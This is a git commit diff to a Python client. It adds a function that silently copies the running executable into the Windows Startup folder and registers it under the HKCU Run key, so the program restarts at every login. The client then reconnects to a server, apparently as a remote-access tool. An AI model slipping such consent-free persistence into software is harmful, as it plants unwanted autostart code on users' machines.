8d4b8608f5c496048cb5af535fc2ef54eabccd67
Dan Sebag <dsebag@asptt.com>
2024-06-02 17:31:16 +0200

    Update with persistance in windows reg client to restart client.exe at startup windows
    And update README.md to add command to generate sel-signed certificate for my exe file

--- client/client.py
+++ client/client.py
@@ -1,8 +1,34 @@
+import os
+import shutil
+import sys
+import winreg
 from network_utils import sio, log_event, attempt_reconnect
 
 
+def add_to_startup(file_path=None):
+    if file_path is None:
+        file_path = os.path.abspath(sys.argv[0])
+
+    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+
+    destination_file = os.path.join(startup_folder, os.path.basename(file_path))
+
+    if os.path.abspath(file_path) != os.path.abspath(destination_file):
+        shutil.copy(file_path, destination_file)
+    else:
+        destination_file = file_path
+
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
+                         winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, 'MyAppName', 0, winreg.REG_SZ, destination_file)
+    winreg.CloseKey(key)
+
+
 def main():
+    add_to_startup()
+
     attempt_reconnect()
+
     try:
         sio.wait()
     except KeyboardInterrupt:
